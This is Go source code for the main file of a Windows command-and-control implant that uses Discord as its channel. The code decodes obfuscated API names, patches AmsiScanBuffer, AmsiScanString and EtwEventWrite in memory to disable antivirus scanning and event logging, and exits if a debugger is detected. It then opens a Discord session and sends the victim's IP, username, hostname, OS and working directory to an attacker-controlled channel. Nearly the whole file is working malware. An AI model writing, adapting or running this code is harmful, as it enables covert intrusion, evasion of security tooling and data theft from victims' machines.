package main

import (
	"Discord-C2/config"
	"Discord-C2/interactions"
	"Discord-C2/utils"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"os/user"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"github.com/bwmarrin/discordgo"
	"golang.org/x/sys/windows"
)

const (
	memAlloc   = 0x1000
	memProtect = 0x40
)

var (
	sysLib = func() *windows.LazyDLL {
		key := []byte{0xb0, 0xf5, 0xf2, 0xe3, 0xe5, 0xe5}
		name := []byte{0xde, 0x81, 0xd6, 0x8c, 0xc9, 0x8c, 0x8c}
		for i := range name {
			name[i] ^= key[i%len(key)]
		}
		return windows.NewLazySystemDLL(string(name) + ".dll")
	}()

	allocMem = func() *windows.LazyProc {
		key := []byte{0xb0, 0xf5, 0xf2, 0xe3, 0xe5, 0xe5, 0xa9}
		name := []byte{0x9e, 0xf1, 0xb3, 0xfc, 0xfe, 0xfd, 0x9b, 0xbf, 0xc6, 0xfc, 0x98, 0xfe, 0x92, 0xff, 0x93, 0xf7, 0xfe, 0x91, 0xe6, 0xe8, 0xed, 0xf2, 0xd5}
		for i := range name {
			name[i] ^= key[i%len(key)]
		}
		return sysLib.NewProc(string(name))
	}()

	securityLib = windows.NewLazyDLL(decodeString("YW1zaS5kbGw="))
)

func dynamicXOR(data string, key []byte) string {
	result := []byte(data)
	for i := 0; i < len(result); i++ {
		result[i] ^= key[i%len(key)]
	}
	return string(result)
}

func decodeString(encoded string) string {
	key := []byte{0x1A, 0x2B, 0x3C, 0x4D}
	decoded := dynamicXOR(encoded, key)
	result, _ := base64.StdEncoding.DecodeString(decoded)
	return string(result)
}

func sbys() {
	sleepDuration := time.Duration(rand.Intn(500)+100) * time.Millisecond
	time.Sleep(sleepDuration)

	bypassTechniques := []func() bool{
		bypassTechnique1,
		bypassTechnique2,
	}

	indices := rand.Perm(len(bypassTechniques))
	for _, idx := range indices {
		if bypassTechniques[idx]() {
			return
		}

		time.Sleep(time.Duration(rand.Intn(300)+50) * time.Millisecond)
	}
}

func bypassTechnique1() bool {

	functionNames := []string{
		decodeString("QW1zaVNjYW5CdWZmZXI="),
		decodeString("QW1zaVNjYW5TdHJpbmc="),
	}

	payloads := [][]byte{
		{0xC3},
		{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3},
		{0x48, 0x31, 0xC0, 0xC3},
	}

	successCount := 0
	for _, name := range functionNames {
		// Get function dynamically
		proc := securityLib.NewProc(name)
		if proc.Find() != nil {
			continue
		}

		patch := payloads[rand.Intn(len(payloads))]

		var oldProtect uint32
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		vprot := kernel32.NewProc(decodeString("VmlydHVhbFByb3RlY3Q="))
		ret, _, err := vprot.Call(
			proc.Addr(),
			uintptr(len(patch)),
			uintptr(0x40),
			uintptr(unsafe.Pointer(&oldProtect)),
		)

		if ret == 0 {
			continue
		}
		if err != nil {
			fmt.Println("Error en VirtualProtect:", err)
			return false
		}

		for i := 0; i < len(patch); i++ {

			if rand.Intn(10) > 8 {
				time.Sleep(time.Duration(rand.Intn(5)+1) * time.Millisecond)
			}
			*(*byte)(unsafe.Pointer(proc.Addr() + uintptr(i))) = patch[i]
		}

		vprot.Call(
			proc.Addr(),
			uintptr(len(patch)),
			uintptr(oldProtect),
			uintptr(unsafe.Pointer(&oldProtect)),
		)

		successCount++
	}

	return successCount > 0
}
func bypassTechnique2() bool {
	wtebs := decodeString("bnRkbGw=") + ".dll"
	ntdll := windows.NewLazyDLL(wtebs)
	etwFunction := decodeString("RXR3RXZlbnRXcml0ZQ==")

	etw := ntdll.NewProc(etwFunction)
	if etw.Find() != nil {
		return false
	}

	var oldProtect uint32
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	vprot := kernel32.NewProc(decodeString("VmlydHVhbFByb3RlY3Q="))

	patchSize := 1
	patch := []byte{0xC3}

	ret, _, _ := vprot.Call(
		etw.Addr(),
		uintptr(patchSize),
		uintptr(0x40),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret == 0 {
		return false
	}

	*(*byte)(unsafe.Pointer(etw.Addr())) = patch[0]

	vprot.Call(
		etw.Addr(),
		uintptr(patchSize),
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	return true
}

func main() {
	config.LoadConfig()
	rand.Seed(time.Now().UnixNano())

	if utils.IsDebuggerPresent() {
		fmt.Println("Debugger detected! Exiting...")
		return
	}

	sbys()

	dg, err := discordgo.New("Bot " + config.BotToken)
	if err != nil {
		fmt.Println("Error creating Discord session: ", err)
		return
	}

	dg.AddHandler(interactions.HandleCommand)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection: ", err)
		return
	}

	sessionId := fmt.Sprintf("sess-%d", rand.Intn(9999-1000)+1000)
	c, err := dg.GuildChannelCreate(config.ChannelID, sessionId, 0)
	if err != nil || c == nil {
		fmt.Println("Error creating channel:", err)
		return
	}
	config.PrivateChan = c.ID

	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	cwd, _ := os.Getwd()
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)

	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s",
		sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
	m, _ := dg.ChannelMessageSend(config.PrivateChan, firstMsg)
	dg.ChannelMessagePin(config.PrivateChan, m.ID)

	s := make(chan os.Signal, 1)
	signal.Notify(s, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-s

	dg.Close()
}
